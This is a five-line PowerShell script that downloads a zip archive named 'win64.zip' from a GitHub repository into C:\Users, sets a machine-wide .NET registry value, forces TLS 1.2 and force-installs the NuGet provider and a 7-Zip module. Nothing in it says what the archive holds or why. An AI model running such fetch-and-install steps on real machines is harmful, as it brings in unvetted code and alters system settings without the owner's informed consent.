invoke-webrequest -uri "https://github.com/Admo9/ProJ04/raw/main/win64.zip" -outfile "C:\Users\win64.zip"
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Wow6432Node\Microsoft\.NetFramework\v4.0.30319' -Name 'SchUseStrongCrypto' -Value '1' -Type DWord
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Install-PackageProvider -Name NuGet -force
Install-Module -Name 7Zip4Powershell -force
